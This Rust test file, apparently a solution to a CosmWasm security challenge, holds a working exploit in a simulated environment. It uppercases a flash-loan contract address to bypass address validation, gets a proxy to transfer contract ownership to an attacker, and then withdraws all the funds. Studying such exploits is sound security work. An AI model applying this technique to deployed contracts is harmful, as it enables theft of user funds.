#[cfg(test)]
pub mod tests {
    use common::flash_loan::{
        Config, ExecuteMsg as FlashLoanExecuteMsg, QueryMsg as FlashLoanQueryMsg,
    };
    use common::proxy::ExecuteMsg;
    use cosmwasm_std::{to_binary, Addr, Uint128};
    use cw_multi_test::Executor;

    use crate::contract::DENOM;
    use crate::integration_tests::tests::{proper_instantiate, ADMIN};

    #[test]
    fn exploit() {
        let (mut app, proxy_contract, flash_loan_contract, _) = proper_instantiate();

        let attacker = "attacker";
        let attacker_addr = Addr::unchecked(attacker);

        let uppercase_flash_loan = flash_loan_contract.to_string().to_uppercase();
        let uppercase_flash_loan_contract = Addr::unchecked(uppercase_flash_loan);

        // 1. create malicious msg to transfer ownership to attack
        let malicious_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: attacker_addr.clone(),
        })
        .unwrap();

        // 2. call proxy to execute on flash loan contract

        // behind the scenes:
        // 2.1 - use uppercase letters to bypass the address validation
        // 2.2 - call TransferOwner so the attacker have admin powers
        // 2.3 - funds are sent back to the contract

        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract,
            &ExecuteMsg::RequestFlashLoan {
                recipient: uppercase_flash_loan_contract,
                msg: malicious_msg,
            },
            &[],
        )
        .unwrap();

        // ensure attacker is the contract admin
        let config: Config = app
            .wrap()
            .query_wasm_smart(flash_loan_contract.clone(), &FlashLoanQueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, attacker_addr);

        // 3. withdraw the funds
        let attacker_bal = app
            .wrap()
            .query_balance(attacker_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(attacker_bal.amount, Uint128::zero());

        app.execute_contract(
            attacker_addr.clone(),
            flash_loan_contract,
            &FlashLoanExecuteMsg::WithdrawFunds {
                recipient: attacker_addr.clone(),
            },
            &[],
        )
        .unwrap();

        let attacker_bal = app
            .wrap()
            .query_balance(attacker_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(attacker_bal.amount, Uint128::new(10_000));
    }
}
